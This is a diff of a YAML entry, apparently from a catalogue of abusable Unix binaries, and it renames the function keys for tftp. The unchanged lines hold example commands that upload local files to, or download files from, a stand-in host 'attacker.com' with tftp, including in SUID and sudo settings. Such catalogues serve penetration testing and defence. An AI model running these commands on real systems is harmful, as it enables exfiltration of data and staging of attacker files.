@@ -1,24 +1,24 @@
 ---
 functions:
-  upload:
+  file-upload:
     - description: Send local file to a TFTP server.
       code: |
         RHOST=attacker.com
         tftp $RHOST
         put file_to_send
-  download:
+  file-download:
     - description: Fetch a remote file from a TFTP server.
       code: |
         RHOST=attacker.com
         tftp $RHOST
         get file_to_get
-  suid-enabled:
+  suid:
     - description: Send local file to a TFTP server.
       code: |
         RHOST=attacker.com
         ./tftp $RHOST
         put file_to_send
-  sudo-enabled:
+  sudo:
     - description: Send local file to a TFTP server.
       code: |
         RHOST=attacker.com
